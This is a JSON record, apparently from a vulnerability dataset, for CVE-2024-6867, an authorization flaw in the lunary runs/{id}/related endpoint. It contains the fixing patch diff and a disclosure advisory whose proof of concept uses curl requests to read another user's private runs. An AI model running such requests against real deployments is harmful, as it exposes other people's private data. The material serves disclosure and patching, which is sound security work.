{
    "CVE-2024-6867": {
        "published_date": "2024-09-13T16:13:02.869Z",
        "patch_commits": [
            {
                "url": "https://github.com/lunary-ai/lunary/commit/35afd4439464571eb016318cd7b6f85a162225ca",
                "content": "fix: related run security patch (#516)\n\nFilename: packages/backend/src/api/v1/runs/index.ts:\n```\n@@ -581,21 +581,46 @@\nruns.patch(\n \n runs.get(\"/:id/related\", checkAccess(\"logs\", \"read\"), async (ctx) => {\n   const id = ctx.params.id\n+  const { projectId } = ctx.state\n \n   const related = await sql`\n-    WITH RECURSIVE related_runs AS (\n-      SELECT r1.*\n-      FROM run r1\n-      WHERE r1.id = ${id}\n-\n-      UNION ALL\n-      SELECT r2.*\n-      FROM run r2\n-      INNER JOIN related_runs rr ON rr.id = r2.parent_run_id\n+    with recursive related_runs as (\n+      select \n+        r1.*\n+      from \n+        run r1\n+      where\n+        r1.id = ${id}\n+        and project_id = ${projectId}\n+\n+      union all \n+\n+      select \n+        r2.*\n+      from \n+        run r2\n+        inner join related_runs rr on rr.id = r2.parent_run_id\n   )\n-  SELECT rr.created_at, rr.tags, rr.project_id, rr.id, rr.status, rr.name, rr.ended_at, rr.error, rr.input, rr.output, \n-        rr.params, rr.type, rr.parent_run_id, rr.completion_tokens, rr.prompt_tokens, rr.feedback, rr.metadata\n-  FROM related_runs rr;\n+  select \n+    rr.created_at, \n+    rr.tags, \n+    rr.project_id, \n+    rr.id, \n+    rr.status, \n+    rr.name, \n+    rr.ended_at, \n+    rr.error, \n+    rr.input, \n+    rr.output, \n+    rr.params, \n+    rr.type, \n+    rr.parent_run_id, \n+    rr.completion_tokens, \n+    rr.prompt_tokens, \n+    rr.feedback, \n+    rr.metadata\n+  from \n+    related_runs rr;\n   `\n \n   ctx.body = related\n```"
            }
        ],
        "sw_version": "v1.4.8",
        "sw_version_wget": "https://github.com/lunary-ai/lunary/archive/refs/tags/v1.4.8.zip",
        "description": "An information disclosure vulnerability exists in the lunary-ai/lunary, specifically in the `runs/{run_id}/related` endpoint. This endpoint does not verify that the user has the necessary access rights to the run(s) they are accessing. As a result, it returns not only the specified run but also all runs that have the `run_id` listed as their parent run. This issue affects the main branch, commit a761d833. The vulnerability allows unauthorized users to obtain information about non-public runs and their related runs, given the `run_id` of a public or non-public run.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/460df515-164c-4435-954b-0233a181545f",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nRun info leak without valid authorization in lunary-ai/lunary\nValid\nReported on May 7th 2024\nSummary\nThe endpoint runs/{run_id}/related does not check that the user has relevant access to the run(s) they are accessing. The endpoint returns not only the run itself, but also all runs that have the run_id listed as its parent run. The other relevant endpoints runs/{run_id} and runs/{run_id}/public checks if the user has access, or if the run is already designated to be public, respectively, indicating that this not desired behaviour.\nPOC\nCreate an user with private project key PRIVATE_KEYand project id PROJECT_ID, and log a run:\ncurl --location 'http://localhost:3333/v1/runs/ingest/' \\\n--header 'Authorization: Bearer PRIVATE_KEY' \\\n--header 'Content-Type: application/json' \\\n--data '{\n    \"events\": [\n        {\n            \"projectId\": \"PROJECT_ID\",\n            \"type\": \"llm\",\n            \"event\": \"start\",\n            \"name\": \"gpt-3.5-turbo\",\n            \"timestamp\": \"2024-05-06T10:00:00Z\",\n            \"input\": [{\"role\": \"user\", \"text\": \"This is my parent run.\"}],\n            \"tags\": [\"tag1\"],\n            \"tokensUsage\": 400,\n            \"runId\": \"parent_run\"\n        }\n    ]\n}'\nAnd its child run:\ncurl --location 'http://localhost:3333/v1/runs/ingest/' \\\n--header 'Authorization: Bearer PRIVATE_KEY' \\\n--header 'Content-Type: application/json' \\\n--data '{\n    \"events\": [\n        {\n            \"projectId\": \"PROJECT_ID\",\n            \"type\": \"llm\",\n            \"event\": \"start\",\n            \"name\": \"gpt-3.5-turbo\",\n            \"timestamp\": \"2024-05-06T16:00:00Z\",\n            \"input\": [{\"role\": \"user\", \"text\": \"This is my child run.\"}],\n            \"tags\": [\"tag1\"],\n            \"tokensUsage\": 400,\n            \"runId\": \"child_run\",\n            \"parentRunId\": \"parent_run\"\n        }\n    ]\n}'\nAs a different (unrelated) user with auth (JWT) token AUTH_TOKEN, call the runs/{run_id}/related endpoint by using the UUID of the created parent run (see Impact for relevant ways on how this might be obtained):\ncurl --location 'http://localhost:3333/v1/runs/RUN_UUID/related' \\\n\n--header 'Authorization: Bearer AUTH_TOKEN'\nThis will then return something like this:\n[\n    {\n        \"createdAt\": \"2024-05-06T10:00:00.000Z\",\n        \"tags\": [\n            \"tag1\"\n        ],\n        \"projectId\": \"ddef0e22-f613-4ab0-9ad6-02bc3896c9c7\",\n        \"id\": \"3a278ce6-80ed-4401-abd3-9d397ab7c858\",\n        \"status\": \"started\",\n        \"name\": \"gpt-3.5-turbo\",\n        \"endedAt\": null,\n        \"error\": null,\n        \"input\": [\n            {\n                \"role\": \"user\",\n                \"text\": \"This is my parent run.\"\n            }\n        ],\n        \"output\": null,\n        \"params\": null,\n        \"type\": \"llm\",\n        \"parentRunId\": null,\n        \"completionTokens\": null,\n        \"promptTokens\": null,\n        \"feedback\": null\n    },\n    {\n        \"createdAt\": \"2024-05-06T16:00:00.000Z\",\n        \"tags\": [\n            \"tag1\"\n        ],\n        \"projectId\": \"ddef0e22-f613-4ab0-9ad6-02bc3896c9c7\",\n        \"id\": \"4df5e85d-246d-4cfa-ad49-da9d26323517\",\n        \"status\": \"started\",\n        \"name\": \"gpt-3.5-turbo\",\n        \"endedAt\": null,\n        \"error\": null,\n        \"input\": [\n            {\n            \"role\": \"user\",\n            \"text\": \"This is my child run.\"\n            }\n        ],\n        \"output\": null,\n        \"params\": null,\n        \"type\": \"llm\",\n        \"parentRunId\": \"3a278ce6-80ed-4401-abd3-9d397ab7c858\",\n        \"completionTokens\": null,\n        \"promptTokens\": null,\n        \"feedback\": null\n    }\n]\nImpact\nThis vulnerability makes it possible to get information about any non-public run given its run_id and runs that are related to it. One likely attack vector would be to get non-public runs that are related to a public parent run, since sharing the public parent run would include sharing its run_id.\nWe are processing your report and will contact thelunary-ai/lunary team within 24 hours.a year ago\nWe have contacted a member of thelunary-ai/lunary team and are waiting to hear backa year ago\nWe have sent a follow up to the lunary-ai/lunary team. We will try again in 4 days.a year ago\nWe have sent a second follow up to the lunary-ai/lunary team. We will try again in 7 days.a year ago\nWe have sent a third follow up to the lunary-ai/lunary team. We will try again in 14 days.a year ago\nWe have sent a fourth follow up to the lunary-ai/lunary team. We will send a final notification 48 hours before report publication.a year ago\nWe have sent a warning to the lunary-ai/lunary team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nMarcello validated this vulnerability10 months ago\npatrik-hahas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-6867assigned to this report.10 months ago\nHugues Chocartmarked this as fixedin 1.4.10with commit35afd49 months ago\nHugues Chocarthas been awarded the fix bounty\nCVE-2024-6867has now been published8 months ago\nSign in to join this conversation\nCVE\nCVE-2024-6867\n(Published)\nVulnerability Type\nCWE-1220: Insufficient Granularity of Access Control\nSeverity\nMedium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nbranch main, commit a761d833\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$75\nFix Bounty\n$18.75\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof of concept outlining the steps required to reproduce the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-1220",
                "value": "CWE-1220 Insufficient Granularity of Access Control"
            }
        ]
    }
}